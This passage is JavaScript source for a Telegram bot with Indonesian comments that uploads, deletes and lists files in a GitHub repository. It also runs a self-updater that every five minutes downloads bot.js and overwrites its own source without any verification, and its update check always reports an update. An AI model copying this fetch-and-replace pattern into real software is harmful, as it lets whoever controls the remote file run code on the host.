                    'Content-Type': 'application/json'
                }
            };
            
            const data = JSON.stringify({
                message: `Auto-update: ${filePath}`,
                content: Buffer.from(content).toString('base64'),
                sha: fileInfo?.sha || null, // SHA untuk replace, null untuk file baru
                branch: GITHUB_CONFIG.branch
            });
            
            const req = https.request(options, (res) => {
                let response = '';
                res.on('data', chunk => response += chunk);
                res.on('end', () => {
                    const result = JSON.parse(response);
                    if (res.statusCode === 200 || res.statusCode === 201) {
                        resolve(result);
                    } else {
                        reject(new Error(result.message));
                    }
                });
            });
            
            req.on('error', reject);
            req.write(data);
            req.end();
        }).catch(reject);
    });
}

// Dapatkan info file existing
async function getFileInfo(filePath) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'api.github.com',
            path: `/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/contents/${filePath}`,
            method: 'GET',
            headers: {
                'Authorization': `token ${GITHUB_CONFIG.token}`,
                'User-Agent': 'Telegram-Bot'
            }
        };
        
        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', chunk => response += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        resolve(JSON.parse(response));
                    } catch {
                        resolve(null);
                    }
                } else {
                    resolve(null);
                }
            });
        });
        
        req.on('error', () => resolve(null));
        req.end();
    });
}

// Filter konten sensitif
function filterContent(content) {
    // Filter token bot
    content = content.replace(/bot\.\w*\(\s*['"`]([^'`"]*YOUR_BOT_TOKEN[^'`"]*)['"`]/g, 'bot.token("***BOT_TOKEN***")');
    content = content.replace(/82333[^*]+\*\*\*nk8/g, '***BOT_TOKEN***');
    
    // Filter GitHub token
    content = content.replace(/ghp_[a-zA-Z0-9]{36}/g, '***GITHUB_TOKEN***');
    
    // Filter umum
    content = content.replace(/(token|key|secret|password)\s*[:=]\s*['"`]([^'`"]{10,})['"`]/gi, '$1: "***FILTERED***"');
    
    return content;
}

// Command untuk hapus file dari repo
bot.onText(/^\/deletefile$/, async (msg) => {
    if (!(await cekAkses("utama", msg))) return;
    
    const chatId = msg.chat.id;
    waitingForReply.set(chatId, 'delete');
    
    bot.sendMessage(chatId,
        '🗑️ <b>DELETE FILE FROM GITHUB</b>\n\n' +
        'Reply dengan nama file yang mau dihapus:\n' +
        '• Contoh: <code>bot.js</code>\n' +
        '• File akan dihapus dari repository\n\n' +
        '<i>Reply dengan nama file...</i>',
        { 
            parse_mode: 'HTML',
            reply_markup: { force_reply: true }
        }
    );
});

// Handle delete file
bot.on('text', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;
    
    const chatId = msg.chat.id;
    
    if (waitingForReply.get(chatId) === 'delete') {
        if (!(await cekAkses("utama", msg))) return;
        waitingForReply.delete(chatId);
        await deleteFileFromRepo(msg.text.trim(), chatId);
    }
});

// Hapus file dari GitHub
async function deleteFileFromRepo(filePath, chatId) {
    try {
        const fileInfo = await getFileInfo(filePath);
        if (!fileInfo) {
            return bot.sendMessage(chatId, `❌ File <code>${filePath}</code> tidak ditemukan`, {
                parse_mode: 'HTML'
            });
        }
        
        const options = {
            hostname: 'api.github.com',
            path: `/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/contents/${filePath}`,
            method: 'DELETE',
            headers: {
                'Authorization': `token ${GITHUB_CONFIG.token}`,
                'User-Agent': 'Telegram-Bot',
                'Content-Type': 'application/json'
            }
        };
        
        const data = JSON.stringify({
            message: `Delete: ${filePath}`,
            sha: fileInfo.sha,
            branch: GITHUB_CONFIG.branch
        });
        
        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', chunk => response += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    bot.sendMessage(chatId, `✅ File <code>${filePath}</code> berhasil dihapus`, {
                        parse_mode: 'HTML'
                    });
                } else {
                    bot.sendMessage(chatId, `❌ Gagal hapus file: ${JSON.parse(response).message}`);
                }
            });
        });
        
        req.write(data);
        req.end();
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// Command list files di repo
bot.onText(/^\/listfiles$/, async (msg) => {
    if (!(await cekAkses("utama", msg))) return;
    
    const chatId = msg.chat.id;
    
    try {
        const files = await getRepoFiles();
        let fileList = '📁 <b>FILES IN REPOSITORY</b>\n\n';
        
        files.slice(0, 20).forEach(file => {
            fileList += `• <code>${file.name}</code>\n`;
        });
        
        if (files.length > 20) {
            fileList += `\n... dan ${files.length - 20} file lainnya`;
        }
        
        bot.sendMessage(chatId, fileList, { parse_mode: 'HTML' });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Dapatkan list files dari repo
async function getRepoFiles() {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'api.github.com',
            path: `/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/contents`,
            method: 'GET',
            headers: {
                'Authorization': `token ${GITHUB_CONFIG.token}`,
                'User-Agent': 'Telegram-Bot'
            }
        };
        
        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', chunk => response += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    resolve(JSON.parse(response));
                } else {
                    reject(new Error('Failed to get files'));
                }
            });
        });
        
        req.on('error', reject);
        req.end();
    });
}

// Auto update checker
setInterval(async () => {
    try {
        const hasUpdate = await checkForUpdate();
        if (hasUpdate) {
            console.log('🔄 Auto-updating from GitHub...');
            await applyUpdate();
            setTimeout(() => process.exit(0), 3000);
        }
    } catch (error) {
        console.log('Update check skipped');
    }
}, 300000);

async function checkForUpdate() {
    return new Promise((resolve) => {
        const options = {
            hostname: 'api.github.com',
            path: `/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/commits/main`,
            method: 'GET',
            headers: {
                'Authorization': `token ${GITHUB_CONFIG.token}`,
                'User-Agent': 'Telegram-Bot'
            }
        };
        
        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', chunk => response += chunk);
            res.on('end', () => {
                resolve(res.statusCode === 200);
            });
        });
        
        req.on('error', () => resolve(false));
        req.end();
    });
}

async function applyUpdate() {
    try {
        const content = await downloadFile('bot.js');
        fs.writeFileSync(__filename, content);
        console.log('✅ Updated successfully');
    } catch (error) {
        console.log('❌ Update failed');
    }
}

function downloadFile(filePath) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'raw.githubusercontent.com',
            path: `/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/main/${filePath}`,
            method: 'GET'
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        });
        
        req.on('error', reject);
        req.end();
    });
}